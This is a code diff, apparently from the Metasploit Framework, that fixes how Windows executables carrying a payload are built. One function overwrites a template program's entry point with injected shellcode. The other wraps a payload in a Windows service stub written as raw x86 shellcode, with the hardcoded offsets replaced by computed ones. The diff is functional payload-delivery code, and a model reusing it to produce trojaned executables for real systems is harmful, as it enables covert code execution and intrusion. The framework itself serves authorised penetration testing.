@@ -299,7 +299,6 @@ require 'msf/core/exe/segment_injector'
   end
 
   def self.to_winpe_only(framework, code, opts={}, arch="x86")
-
     if arch == ARCH_X86_64
       arch = ARCH_X64
     end
@@ -310,9 +309,9 @@ require 'msf/core/exe/segment_injector'
     pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
 
     exe = ''
-      File.open(opts[:template], 'rb') { |fd|
-        exe = fd.read(fd.stat.size)
-      }
+    File.open(opts[:template], 'rb') { |fd|
+      exe = fd.read(fd.stat.size)
+    }
 
     pe_header_size = 0x18
     section_size = 0x28
@@ -356,7 +355,6 @@ require 'msf/core/exe/segment_injector'
     # put the shellcode at the entry point, overwriting template
     entryPoint_file_offset = pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint)
     exe[entryPoint_file_offset,code.length] = code
-
     return exe
   end
 
@@ -406,7 +404,8 @@ require 'msf/core/exe/segment_injector'
     return pe
   end
 
-  def self.string_to_pushes(str)
+  def self.string_to_pushes(string)
+    str = string.dup
     # Align string to 4 bytes
     rem = (str.length) % 4
     if (rem > 0)
@@ -510,11 +509,20 @@ require 'msf/core/exe/segment_injector'
       # Allow the user to specify their own service EXE template
       set_template_default(opts, "template_x86_windows_svc.exe")
       opts[:exe_type] = :service_exe
-      exe_sub_method(code,opts)
+      return exe_sub_method(code,opts)
     else
       name = opts[:servicename]
-      name ||= Rex::Text.rand_text_alpha(7)
+      name ||= Rex::Text.rand_text_alpha(8)
       pushed_service_name = string_to_pushes(name)
+
+      precode_size = 0xc6
+      svcmain_code_offset = precode_size + pushed_service_name.length
+
+      precode_size += 0x06
+      hash_code_offset = precode_size + pushed_service_name.length
+
+      precode_size -= 0x0d
+      svcctrlhandler_code_offset = precode_size + pushed_service_name.length
 
       # code_service could be encoded in the future
       code_service =
@@ -528,16 +536,17 @@ require 'msf/core/exe/segment_injector'
         "\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
         "\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
         "\x6A\x00\x68\x70\x69\x33\x32\x68\x61\x64\x76\x61\x54\x68\x4C\x77" +
-        "\x26\x07\xFF\xD5"+pushed_service_name+"\x89\xE1" +
-        "\x8D\x85\xD0\x00\x00\x00\x6A\x00\x50\x51\x89\xE0\x6A\x00\x50\x68" +
-        "\xFA\xF7\x72\xCB\xFF\xD5\x6A\x00\x68\xF0\xB5\xA2\x56\xFF\xD5\x58" +
-        "\x58\x58\x58\x31\xC0\xC3\xFC\xE8\x00\x00\x00\x00\x5D\x81\xED\xD6" +
-        "\x00\x00\x00"+pushed_service_name+"\x89\xE1\x8D" +
-        "\x85\xC9\x00\x00\x00\x6A\x00\x50\x51\x68\x0B\xAA\x44\x52\xFF\xD5" +
-        "\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x04\x6A\x10" +
-        "\x89\xE1\x6A\x00\x51\x50\x68\xC6\x55\x37\x7D\xFF\xD5"
-
-      to_winpe_only(framework, code_service + code, opts)
+        "\x26\x07\xFF\xD5"+pushed_service_name+"\x89\xE1\x8D\x85" +
+         [svcmain_code_offset].pack('<I')+"\x6A\x00\x50\x51\x89\xE0\x6A\x00" +
+        "\x50\x68\xFA\xF7\x72\xCB\xFF\xD5\x6A\x00\x68\xF0\xB5\xA2\x56\xFF" +
+        "\xD5\x58\x58\x58\x58\x31\xC0\xC3\xFC\xE8\x00\x00\x00\x00\x5D\x81" +
+        "\xED"+[hash_code_offset].pack('<I')+pushed_service_name+"\x89\xE1" +
+        "\x8D\x85"+[svcctrlhandler_code_offset].pack('<I')+"\x6A\x00\x50" +
+        "\x51\x68\x0B\xAA\x44\x52\xFF\xD5\x6A\x00\x6A\x00\x6A\x00\x6A\x00" +
+        "\x6A\x00\x6A\x00\x6A\x04\x6A\x10\x89\xE1\x6A\x00\x51\x50\x68\xC6" +
+        "\x55\x37\x7D\xFF\xD5"
+      
+      return to_winpe_only(framework, code_service + code, opts)
     end
   end
 
